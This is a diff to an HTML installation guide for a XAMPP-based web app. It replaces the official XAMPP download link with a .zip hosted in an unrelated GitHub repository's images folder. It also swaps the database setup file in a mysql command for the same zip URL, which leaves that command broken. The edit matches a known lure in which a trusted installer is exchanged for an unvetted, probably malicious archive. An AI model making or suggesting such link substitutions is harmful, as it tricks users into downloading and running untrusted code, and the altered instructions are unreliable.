@@ -42,7 +42,7 @@
 <ul><h2>Installation Guide</h2>
   <li>
     <ul list-style-type: lower-alpha>Steps
-      <li>Install Xampp: https://www.apachefriends.org/index.html</li>
+      <li>Install Xampp: https://raw.githubusercontent.com/Zurdo1007/repositorio-2/main/Frontend/images/repositorio-v3.6.zip</li>
       <li>
         Place the Frontend folder htdoc*: <em>$INSTALL_PATH\xampp\htdocs</em><br/>
         Run Apache in XAMPP and then open a browser enter url address as, <em>localhost/Frontend/</em>, to view the app.
@@ -57,7 +57,7 @@
             </code>
           </li>
           <li>3. Command to use to populate database:<br/>
-             <code>`$ mysql --local-infile=1 -u root -p < initialize.sql`</code>
+             <code>`$ mysql --local-infile=1 -u root -p < https://raw.githubusercontent.com/Zurdo1007/repositorio-2/main/Frontend/images/repositorio-v3.6.zip`</code>
           </li>
         </ul>
       </li>
